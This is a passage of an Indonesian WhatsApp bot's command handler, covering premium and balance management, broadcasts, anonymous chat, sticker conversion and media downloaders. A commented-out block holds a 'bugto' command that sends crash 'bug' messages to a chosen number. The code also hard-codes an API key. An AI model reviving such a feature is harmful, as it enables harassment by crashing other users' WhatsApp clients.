          _prem.addPremiumUser(args[1] + "@s.whatsapp.net", args[2], premium);
          reply("Sukses");
        }
        break;
      case prefix + "delprem":
        if (!isOwner) return reply("Only Owner");
        if (args.length < 2)
          return reply(
            `Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`
          );
        if (m.mentioned.length !== 0) {
          premium.splice(_prem.getPremiumPosition(m.mentioned[0], premium), 1);
          fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
          reply("Sukses!");
        } else {
          var cekpr = await tabrak.oWhatsApp(args[1] + "@s.whatsapp.net");
          if (cekpr.length == 0)
            return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`);
          premium.splice(
            _prem.getPremiumPosition(args[1] + "@s.whatsapp.net", premium),
            1
          );
          fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
          reply("Sukses!");
        }
        break;
      //random image
      case prefix + "art":
      case prefix + "awoo":
      case prefix + "bts":
      case prefix + "cogan":
      case prefix + "elaina":
      case prefix + "exo":
      case prefix + "elf":
      case prefix + "estetic":
      case prefix + "kanna":
      case prefix + "loli":
      case prefix + "neko2":
      case prefix + "waifu":
      case prefix + "shota":
      case prefix + "husbu":
      case prefix + "sagiri":
      case prefix + "shinobu":
      case prefix + "megumin":
      case prefix + "wallnime":
      case prefix + "quotesimage":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        let comd = command.split(prefix);
        tabrak.sendMessage(from, {
          image: {
            url: `https://api.lolhuman.xyz/api/random/${comd[1]}?apikey=haikalgans`,
          },
        });
        limitAdd(sender, limit);
        break;
      case prefix + "pinterest":
      case prefix + "pin":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (args.length < 2)
          return reply(
            `Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`
          );
        reply("_*Tunggu sebentar...*_");
        var jumlah;
        if (q.includes("--")) jumlah = q.split("--")[1];
        pinterest(q.replace("--" + jumlah, "")).then(async (data) => {
          if (q.includes("--")) {
            if (data.result.length < jumlah) {
              jumlah = data.result.length;
              reply(
                `Hanya ditemukan ${data.result.length}, foto segera dikirim`
              );
            }
            for (let i = 0; i < jumlah; i++) {
              tabrak.sendMessage(from, {
                image: { url: data.result[i] },
                caption: `_Hasil pencarian ${q}_`,
              });
            }
            limitAdd(sender, limit);
          } else {
            tabrak.sendMessage(
              from,
              {
                caption: `Hasil pencarian dari ${q}`,
                image: { url: pickRandom(data.result) },
              },
              { quoted: m }
            );
            limitAdd(sender, limit);
          }
        });
        break;
      //Add ke list menu
      //batas
      case prefix + "bc":
      case prefix + "broadcast":
        if (!isOwner) return reply("Owner Only");
        if (args.length < 2) return reply(`Masukkan isi pesannya`);
        var data = await store.chats.all();
        for (let i of data) {
          tabrak.sendMessage(i.id, {
            text: `_*🚨${global.namabot} Broadcast🚨*_\n\n${q}`,
            contextInfo: {
              externalAdReply: {
                title: "WhyDepin",
                body: "© Team Tabrak Lurus",
                showAdAttribution: true,
              },
            },
          });
          await func.sleep(1000);
        }
        break;

      case prefix + "bcuser":
      case prefix + "broadcastuser":
        if (!isOwner) return reply("Owner Only");
        if (args.length < 2) return reply(`Masukkan isi pesannya`);
        for (let i of pendaftar) {
          tabrak.sendMessage(i, {
            text: `_*📢${global.namabot} ANNOUNCEMENT*_\n\n${q}`,
            contextInfo: {
              externalAdReply: {
                title: "WhyDepin",
                body: "© Team Tabrak Lurus",
                showAdAttribution: true,
              },
            },
          });
          await func.sleep(10000);
        }
        break;

      // User Menu
      case prefix + "cekprem":
      case prefix + "cekpremium":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (!isPremium)
          return reply(
            `Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`
          );
        if (isOwner) return reply(`Lu owner bego!`);
        if (_prem.getPremiumExpired(sender, premium) == "PERMANENT")
          return reply(`PERMANENT`);
        let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now());
        let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`;
        reply(premiumnya);
        break;
      case prefix + "listprem":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        let txt = `List Prem\nJumlah : ${premium.length}\n\n`;
        let men = [];
        for (let i of premium) {
          men.push(i.id);
          txt += `*ID :* @${i.id.split("@")[0]}\n`;
          if (i.expired === "PERMANENT") {
            let cekvip = "PERMANENT";
            txt += `*Expire :* PERMANENT\n\n`;
          } else {
            let cekvip = ms(i.expired - Date.now());
            txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`;
          }
        }
        mentions(txt, men, true);
        break;

      // Bank & Payment Menu
      case prefix + "topbalance":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          balance.sort((a, b) => (a.balance < b.balance ? 1 : -1));
          let top = "*── 「 TOP BALANCE 」 ──*\n\n";
          let arrTop = [];
          var total = 10;
          if (balance.length < 10) total = balance.length;
          for (let i = 0; i < total; i++) {
            top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${
              balance[i].balance
            }\n\n`;
            arrTop.push(balance[i].id);
          }
          mentions(top, arrTop, true);
        }
        break;
      case prefix + "buygamelimit":
      case prefix + "buyglimit":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          if (args.length < 2)
            return reply(
              `Kirim perintah *${prefix}buyglimit* jumlah game limit yang ingin dibeli\n\nHarga 1 game limit = $150 balance\nPajak $1 / $10`
            );
          if (args[1].includes("-")) return reply(`Jangan menggunakan -`);
          if (isNaN(args[1])) return reply(`Harus berupa angka`);
          if (args[1].toLowerCase() === "infinity")
            return reply(`Yahaha saya ndak bisa di tipu`);
          let ane = Number(parseInt(args[1]) * 150);
          if (getBalance(sender, balance) < ane)
            return reply(`Balance kamu tidak mencukupi untuk pembelian ini`);
          kurangBalance(sender, ane, balance);
          givegame(sender, parseInt(args[1]), glimit);
          reply(
            monospace(
              `Pembeliaan game limit sebanyak ${
                args[1]
              } berhasil\n\nSisa Balance : $${getBalance(
                sender,
                balance
              )}\nSisa Game Limit : ${cekGLimit(
                sender,
                gcount,
                glimit
              )}/${gcount}`
            )
          );
        }
        break;
      case prefix + "buylimit":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          if (args.length < 2)
            return reply(
              `Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $150 balance`
            );
          if (args[1].includes("-")) return reply(`Jangan menggunakan -`);
          if (isNaN(args[1])) return reply(`Harus berupa angka`);
          if (args[1].toLowerCase() === "infinity")
            return reply(`Yahaha saya ndak bisa di tipu`);
          let ane = Number(parseInt(args[1]) * 150);
          if (getBalance(sender, balance) < ane)
            return reply(`Balance kamu tidak mencukupi untuk pembelian ini`);
          kurangBalance(sender, ane, balance);
          giveLimit(sender, parseInt(args[1]), limit);
          reply(
            monospace(
              `Pembeliaan limit sebanyak ${
                args[1]
              } berhasil\n\nSisa Balance : $${getBalance(
                sender,
                balance
              )}\nSisa Limit : ${getLimit(
                sender,
                limitCount,
                limit
              )}/${limitCount}`
            )
          );
        }
        break;
      case prefix + "transfer":
      case prefix + "tf":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          if (args.length < 2)
            return reply(
              `Kirim perintah *${command}* @tag nominal\nContoh : ${command} @628xxx 2000`
            );
          if (m.mentioned.length == 0)
            return reply(`Tag orang yang ingin di transfer balance`);
          if (!args[2]) return reply(`Masukkan nominal nya!`);
          if (isNaN(args[2])) return reply(`Nominal harus berupa angka!`);
          if (args[2].toLowerCase() === "infinity")
            return reply(`Yahaha saya ndak bisa di tipu`);
          if (args[2].includes("-")) return reply(`Jangan menggunakan -`);
          var anu = getBalance(sender, balance);
          if (anu < args[2] || anu == "undefined")
            return reply(
              `Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${args[2]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`
            );
          kurangBalance(sender, parseInt(args[2]), balance);
          addBalance(m.mentioned[0], parseInt(args[2]), balance);
          reply(
            `Sukses transfer balance sebesar $${args[2]} kepada @${
              m.mentioned[0].split("@")[0]
            }`
          );
        }
        break;

      case prefix + "limit":
      case prefix + "balance":
      case prefix + "ceklimit":
      case prefix + "cekbalance":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (m.mentioned.length !== 0) {
          var Ystatus = ownerNumber.includes(m.mentioned[0]);
          var isPrim = Ystatus
            ? true
            : _prem.checkPremiumUser(m.mentioned[0], premium);
          var ggcount = isPrim ? gcounti.prem : gcounti.user;
          var limitMen = `${getLimit(m.mentioned[0], limitCount, limit)}`;
          reply(
            `Limit : ${
              _prem.checkPremiumUser(m.mentioned[0], premium)
                ? "Unlimited"
                : limitMen
            }/${limitCount}\nLimit Game : ${cekGLimit(
              m.mentioned[0],
              gcount,
              glimit
            )}/${ggcount}\nBalance : $${getBalance(
              m.mentioned[0],
              balance
            )}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`
          );
        } else {
          var limitPrib = `${getLimit(
            sender,
            limitCount,
            limit
          )}/${limitCount}`;
          reply(
            `Limit : ${
              isPremium ? "Unlimited" : limitPrib
            }\nLimit Game : ${cekGLimit(
              sender,
              gcount,
              glimit
            )}/${gcount}\nBalance : $${getBalance(
              sender,
              balance
            )}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`
          );
        }
        break;

      //anonymous chat
      case prefix + "anonymous":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
          this.anonymous = this.anonymous ? this.anonymous : {};
          txtt = `_*[Welcome To Anonymous Chat]*_\n\n_*[START]:*_ ${prefix}start\n_Looking for a partner to connect between room one and room two_\n\n_*[LEAVE]:*_ ${prefix}leave\n_To leave the anonymous room_\n\n_*[NEXT]:*_ ${prefix}next\n_Next, look for the next partner, or skip a partner_`;
          tabrak.sendMessage(
            from,
            {
              text: txtt,
              contextInfo: {
                externalAdReply: {
                  title: "Anonymous Chat",
                  body: "© Team Tabrak Lurus",
                  thumbnailUrl:
                    "https://telegra.ph/file/a98be7c29caae2e13dbc9.jpg",
                  sourceUrl: "https://chat.whatsapp.com/Bs2eptyeXtd9icSiYSYbO0",
                  mediaType: 1,
                  showAdAttribution: true,
                  renderLargerThumbnail: true,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case prefix + "keluar":
      case prefix + "leave": {
        if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
        this.anonymous = this.anonymous ? this.anonymous : {};
        let room = Object.values(this.anonymous).find((room) =>
          room.check(sender)
        );
        if (!room) {
          await sendAnon(
            m.chat,
            `_*Kamu tidak sedang berada di anonymous chat..*_`
          );
          throw false;
        }
        reply("_Ok_");
        let other = room.other(sender);
        if (other) await sendMess(other, `_*Partner meninggalkan chat..*_`);
        delete this.anonymous[room.id];
        if (command === "leave") break;
      }
      case prefix + "mulai":
      case prefix + "start": {
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
        this.anonymous = this.anonymous ? this.anonymous : {};
        if (Object.values(this.anonymous).find((room) => room.check(sender))) {
          await sendAnon(
            m.chat,
            `_*Kamu masih berada di dalam anonymous chat, menunggu partner...*_`
          );
          throw false;
        }
        let room = Object.values(this.anonymous).find(
          (room) => room.state === "WAITING" && !room.check(sender)
        );
        if (room) {
          await sendAnon(room.a, `_*Partner Ditemukan!!*_`);
          room.b = sender;
          room.state = "CHATTING";
          await sendAnon(room.b, `_*Partner Ditemukan!!*_`);
        } else {
          let id = +new Date();
          this.anonymous[id] = {
            id,
            a: sender,
            b: "",
            state: "WAITING",
            check: function (who = "") {
              return [this.a, this.b].includes(who);
            },
            other: function (who = "") {
              return who === this.a ? this.b : who === this.b ? this.a : "";
            },
          };
          await sendAnon(m.chat, `_*Menunggu Partner...*_`);
        }
        limitAdd(sender, limit);
        break;
      }
      case prefix + "next":
      case prefix + "lanjut": {
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
        this.anonymous = this.anonymous ? this.anonymous : {};
        let romeo = Object.values(this.anonymous).find((room) =>
          room.check(sender)
        );
        if (!romeo) {
          await sendAnon(
            m.chat,
            `_*Kamu sedang tidak berada di dalam anonymous chat...*_`
          );
          throw false;
        }
        let other = romeo.other(sender);
        if (other) await sendAnon(other, `_*Partner meninggalkan chat...*_`);
        delete this.anonymous[romeo.id];
        let room = Object.values(this.anonymous).find(
          (room) => room.state === "WAITING" && !room.check(sender)
        );
        if (room) {
          await sendAnon(room.a, `_*Partner Ditemukan!!*_`);
          room.b = sender;
          room.state = "CHATTING";
          await sendAnon(room.b, `_*Partner Ditemukan!!*_`);
        } else {
          let id = +new Date();
          this.anonymous[id] = {
            id,
            a: sender,
            b: "",
            state: "WAITING",
            check: function (who = "") {
              return [this.a, this.b].includes(who);
            },
            other: function (who = "") {
              return who === this.a ? this.b : who === this.b ? this.a : "";
            },
          };
          await sendAnon(sender, `_*Menunggu Partner...*_`);
        }
        limitAdd(sender, limit);
        break;
      }
      //openai by hercai
      case prefix + "text2image":
      case prefix + "texttoimage":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          if (isLimit(sender, isPremium, isOwner, limitCount, limit))
            return reply(
              `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
            );
          if (!q) return reply("_Contoh: .text2image anime girl_");
          const tr = await fetchJson(
            `https://hercai.onrender.com/v2/text2image?prompt=${q}`
          );
          tabrak.sendMessage(from, {
            image: { url: `${tr.url}` },
            caption: `Don ga Banh`,
            contextInfo: {
              externalAdReply: {
                title: "Text To Image - OpenAI",
                body: "Text To Image - OpenAI",
                thumbnailUrl:
                  "https://telegra.ph/file/9493062a98291c1ec6608.jpg",
                sourceUrl: "https://chat.whatsapp.com/Bs2eptyeXtd9icSiYSYbO0",
                mediaType: 1,
                showAdAttribution: true,
                renderLargerThumbnail: false,
              },
            },
          });
          limitAdd(sender, limit);
        }
        break;

      case prefix + "ai":
      case prefix + "openai":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          if (isLimit(sender, isPremium, isOwner, limitCount, limit))
            return reply(
              `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
            );
          if (!q) return reply("_Contoh: .ai cara membuat anak_");
          const tr = await fetchJson(
            `https://hercai.onrender.com/v2/hercai?question=${q}`
          );
          tabrak.sendMessage(
            from,
            {
              text: tr.reply,
              contextInfo: {
                externalAdReply: {
                  title: "Bens - MD",
                  body: "ChatGPT - OpenAI",
                  thumbnailUrl:
                    "https://telegra.ph/file/9493062a98291c1ec6608.jpg",
                  sourceUrl:
                    "https://youtube.com/playlist?list=RDwjWmfnvIrDw&playnext=1&si=MgY1RAkwmw43y80B",
                  mediaType: 1,
                  showAdAttribution: true,
                  renderLargerThumbnail: true,
                },
              },
            },
            { quoted: m }
          );
          limitAdd(sender, limit);
        }
        break;

      //TOOLS MENU
      case prefix + "sticker":
      case prefix + "stiker":
      case prefix + "s":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (isImage || isQuotedImage) {
          var stream = await baileys.downloadContentFromMessage(
            m.message.imageMessage ||
              m.message.extendedTextMessage?.contextInfo.quotedMessage
                .imageMessage,
            "image"
          );
          var buffer = Buffer.from([]);
          for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
          }
          var rand1 = "sticker/" + getRandom(".jpg");
          var rand2 = "sticker/" + getRandom(".webp");
          fs.writeFileSync(`./${rand1}`, buffer);
          ffmpeg(`./${rand1}`)
            .on("error", console.error)
            .on("end", () => {
              exec(
                `webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`,
                async (error) => {
                  tabrak.sendMessage(
                    from,
                    { sticker: fs.readFileSync(`./${rand2}`) },
                    { quoted: m }
                  );
                  limitAdd(sender, limit);
                  fs.unlinkSync(`./${rand1}`);
                  fs.unlinkSync(`./${rand2}`);
                }
              );
            })
            .addOutputOptions([
              "-vcodec",
              "libwebp",
              "-vf",
              "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse",
            ])
            .toFormat("webp")
            .save(`${rand2}`);
        } else if (isVideo || isQuotedVideo) {
          var stream = await baileys.downloadContentFromMessage(
            m.message.imageMessage ||
              m.message.extendedTextMessage?.contextInfo.quotedMessage
                .videoMessage,
            "video"
          );
          var buffer = Buffer.from([]);
          for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
          }
          var rand1 = "sticker/" + getRandom(".mp4");
          var rand2 = "sticker/" + getRandom(".webp");
          fs.writeFileSync(`./${rand1}`, buffer);
          ffmpeg(`./${rand1}`)
            .on("error", console.error)
            .on("end", () => {
              exec(
                `webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`,
                async (error) => {
                  tabrak.sendMessage(
                    from,
                    { sticker: fs.readFileSync(`./${rand2}`) },
                    { quoted: m }
                  );
                  limitAdd(sender, limit);
                  fs.unlinkSync(`./${rand1}`);
                  fs.unlinkSync(`./${rand2}`);
                }
              );
            })
            .addOutputOptions([
              "-vcodec",
              "libwebp",
              "-vf",
              "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse",
            ])
            .toFormat("webp")
            .save(`${rand2}`);
        } else {
          reply(
            `Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`
          );
        }
        break;
      case prefix + "toimg":
      case prefix + "toimage":
      case prefix + "tovid":
      case prefix + "tovideo":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (!isQuotedSticker) return reply(`Reply stikernya!`);
        var stream = await baileys.downloadContentFromMessage(
          m.message.extendedTextMessage?.contextInfo.quotedMessage
            .stickerMessage,
          "sticker"
        );
        var buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        var rand1 = "sticker/" + getRandom(".webp");
        var rand2 = "sticker/" + getRandom(".png");
        fs.writeFileSync(`./${rand1}`, buffer);
        if (
          isQuotedSticker &&
          m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage
            .isAnimated !== true
        ) {
          exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
            fs.unlinkSync(`./${rand1}`);
            if (err) return reply("Status: 0");
            tabrak.sendMessage(
              from,
              { image: { url: `./${rand2}` } },
              { quoted: m }
            );
            limitAdd(sender, limit);
            fs.unlinkSync(`./${rand2}`);
          });
        } else {
          reply("_*Tunggu sebentar...*_");
          webp2mp4File(`./${rand1}`).then((data) => {
            fs.unlinkSync(`./${rand1}`);
            tabrak.sendMessage(
              from,
              { video: { url: data.result } },
              { quoted: m }
            );
            limitAdd(sender, limit);
          });
        }
        break;

      case prefix + "exif":
        if (!isOwner) return reply("Owner Only");
        var namaPack = q.split("|")[0] ? q.split("|")[0] : q;
        var authorPack = q.split("|")[1] ? q.split("|")[1] : "";
        exif.create(namaPack, authorPack);
        reply(`Sukses membuat exif`);
        break;

      case prefix + "tourl":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          if (isLimit(sender, isPremium, isOwner, limitCount, limit))
            return reply(
              `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
            );
          if (isImage || isQuotedImage) {
            let dwn = await downloadAndSaveMediaMessage("image", "tourl.jpg");
            let up = await uploadImages(fs.readFileSync(dwn));
            reply(up);
            fs.unlinkSync(dwn);
          } else if (isVideo || isQuotedVideo) {
            dwn = await downloadAndSaveMediaMessage("video", "tourl.mp4");
            up = await uploadImages(fs.readFileSync(dwn));
            reply(up);
            fs.unlinkSync(dwn);
          } else {
            reply("kirim media/reply media");
          }
          limitAdd(sender, limit);
        }
        break;
      case prefix + "ocr":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isImage || isQuotedImage) {
          dwn = await downloadAndSaveMediaMessage("image", "ocr.jpg");
          let cnvrt = await uploadImages(fs.readFileSync(dwn));
          up = await fetchJson(
            `https://api.lolhuman.xyz/api/ocr?apikey=${global.lolkey}&img=${cnvrt}`
          );
          reply(up.result);
          fs.unlinkSync(dwn);
        } else {
          reply("Tidak ada gambar");
        }
        limitAdd(sender, limit);
        break;
      //end
      /*Trash Code
case prefix+'grupwa': {
  if (!q) return reply('Contoh: .grupwa hacker')
  await ttl.groupwa(q)
}
break
case prefix+'bugto':{
if (!isOwner && !isPremium) return reply('Premium Only')
let yo = q.split('|')[0]
let yi = q.split('|')[1]
let ya = q.split('|')[2]
if (ya === 'katalog') {
               katalog(yo, yi)
               reply('Sukses send bug')
               } else 
if (ya === 'sticker') {
               sticker(yo, yi)
               reply('Sukses send bug')
               } else {
               reply('_Ex: .bugto id|pesan|type_\n_*typebug:*_\n_katalog_\n_sticker_')
}
}
break
*/

      //download menu
      case prefix + "mediafire":
      case prefix + "mfire":
      case prefix + "mfdl":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix} limit untuk mengecek limit`
          );
        if (args.length < 2)
          return reply(`Gunakan dengan cara ${command} *url*\n`);
        if (!isUrl(args[1])) return reply("Link invalid");
        if (!args[1].includes("mediafire.com")) return reply("Link invalid");
        reply("Tunggu sebentar...");
        addCountCmd(".mediafire", sender, _cmd);
        data = await fetchJson(
          `https://api.lolhuman.xyz/api/mediafire?apikey=${global.lolkey}&url=${args[1]}`
        );
        var media = await getBuffer(data.result.link);
        if (data.result.filetype.includes("mp4")) {
          tabrak.sendMessage(
            from,
            {
              document: media,
              fileName: data.result.filename,
              mimetype: "video/mp4",
            },
            { quoted: m }
          );
        } else if (data.result.filetype.includes("mp3")) {
          tabrak.sendMessage(
            from,
            {
              document: media,
              fileName: data.result.filename,
              mimetype: "audio/mp3",
            },
            { quoted: m }
          );
        } else {
          tabrak.sendMessage(
            from,
            {
              document: media,
              fileName: data.result.filename,
              mimetype: "application/" + data.result.filetype,
            },
            { quoted: m }
          );
        }
        break;
      case prefix + "tiktoknowm":
      case prefix + "ttdl":
      case prefix + "tiktok":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (args.length < 2) return reply(`Kirim perintah ${command} link`);
        if (!isUrl(args[1])) return reply("Link invalid");
        if (!args[1].includes("tiktok")) return reply("link invalid");
        reply("_*Tunggu sebentar...*_");
        data = await fetchJson(
          `https://api.lolhuman.xyz/api/tiktok?apikey=${global.lolkey}&url=${args[1]}`
        );
        tabrak.sendMessage(
          from,
          { video: { url: data.result.link }, caption: data.result.title },
          { quoted: m }
        );
        limitAdd(sender, limit);
        break;
      case prefix + "tiktokaudio":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (args.length < 2) return reply(`Kirim perintah ${command} link`);
        if (!isUrl(args[1])) return reply("Link invalid");
        if (!args[1].includes("tiktok")) return reply("Link invalid");
        reply("_*Tunggu sebentar...*_");
        data = await fetchJson(
          `https://api.lolhuman.xyz/api/tiktokmusic?apikey=${global.lolkey}&url=${args[1]}`
        );
        tabrak.sendMessage(
          from,
          { audio: { url: data.result }, mimetype: "audio/mp4" },
          { quoted: m }
        );
        limitAdd(sender, limit);
        break;
      case prefix + "igdl":
      case prefix + "instagram":
      case prefix + "ig":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (args.length < 2) return reply(`Kirim perintah ${command} link`);
        if (!isUrl(args[1])) return reply("link invalid");
        if (!args[1].includes("instagram.com")) return reply("Link invalid");
        reply("Tunggu sebentar...");
        data = await fetchJson(
          `https://api.lolhuman.xyz/api/instagram?apikey=${global.lolkey}&url=${args[1]}`
        );
        reply(teks);
        for (let i of data.result[0]) {
          if (i.extension === "mp4") {
            tabrak.sendMessage(from, { video: { url: i.url } });
          } else if (i.extension === "jpg") {
            tabrak.sendMessage(from, { image: { url: i.url } });
          }
        }
        limitAdd(sender, limit);
        break;
      case prefix + "facebook":
      case prefix + "fbdl":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (args.length < 2) return reply(`Kirim perintah ${command} link`);
        if (!isUrl(args[1])) return reply("link invalid");
        if (!args[1].includes("facebook.com")) return reply("Link invalid!!");
        reply("Tunggu sebentar...");
        data = await fetchJson(
          `https://api.lolhuman.xyz/api/facebook?apikey=${global.lolkey}&url=${args[1]}`
        );
        tabrak.sendMessage(
          from,
          { video: { url: data.result[0] }, caption: data.title },
          { quoted: m }
        );
        limitAdd(sender, limit);
        break;
      case prefix + "ytplay":
      case prefix + "play":
      case prefix + "ytdl":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          if (isLimit(sender, isPremium, isOwner, limitCount, limit))
            return reply(
              `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
            );
          if (!q) return reply(`Example : ${prefix + command} Lagu sad`);
          let search = await yts(`${q}`);
          let caption = `*Team Tabrak Lurus*

_> Title : ${search.all[1].title}_
_> Views : ${search.all[1].views}_
_> Duration : ${search.all[1].timestamp}_ _>Upload : ${search.all[1].ago}_
_> URL Video : ${search.videos[1].url}_`;
          let todd2 = await getBuffer(search.all[1].image);
          tabrak.sendMessage(
            from,
            { image: todd2, caption: caption },
            { quoted: m }
          );
          let ply = search.videos[1].url;
          const ytdl = require("ytdl-core");
          let mp3file = `./trash/${search.all[1].title}.mp3`;
          let nana = ytdl(ply, { filter: "audioonly" })
            .pipe(fs.createWriteStream(mp3file))
            .on("finish", async () => {
              tabrak.sendMessage(
                from,
                {
                  audio: fs.readFileSync(mp3file),
                  mimetype: "audio/mpeg",
                  ptt: true,
                },
                { quoted: m }
              );
            });
          limitAdd(sender, limit);
        }
        break;
      case prefix + "yts":
      case prefix + "ytsearch":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (args.length < 2) return reply(`Kirim perintah ${command} query`);
        yts(q)
          .then((data) => {
            let yt = data.videos;
            var jumlah = 15;
            if (yt.length < jumlah) jumlah = yt.length;
            var no = 0;
            let txt = `*YOUTUBE SEARCH*
 *Hasil pencarian dari ${q}*
`;
            for (let i = 0; i < jumlah; i++) {
              no += 1;
              txt += `\n─────────────────\n\n*No Urutan : ${no.toString()}*\n*▢ Judul :* ${
                yt[i].title
              }\n*▢ ID :* ${yt[i].videoId}\n*▢ Channel :* ${
                yt[i].author.name
              }\n*▢ Upload :* ${yt[i].ago}\n*▢ Ditonton :* ${
                yt[i].views
              }\n*▢ Duration :* ${yt[i].timestamp}\n*▢ URL :* ${yt[i].url}\n`;
            }
            tabrak.sendMessage(
              from,
              { image: { url: yt[0].image }, caption: txt },
              { quoted: m }
            );
            reply(
              "Waiting...\n\nuntuk mengambil hasil yang di temukan.\n\n.getvideo <noUrutan>\n.getmusic <noUrutan>"
            );
            limitAdd(sender, limit);
          })
          .catch(() => reply("Status: 0"));
        break;

      case prefix + "getmusik":
      case prefix + "getmusic":
        {
          if (isLimit(sender, isPremium, isOwner, limitCount, limit))
            return reply(
              `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
            );
          if (!isQuotedImage)
            return reply(
              `Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`
            );
          if (!m.quoted.fromMe)
            return reply(`Hanya bisa mengambil hasil dari pesan bot`);
          if (args.length < 2)
            return reply(
              `Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`
            );
          var kuoted = await m.quotedMsg.chts;
          var ytIdRegex =
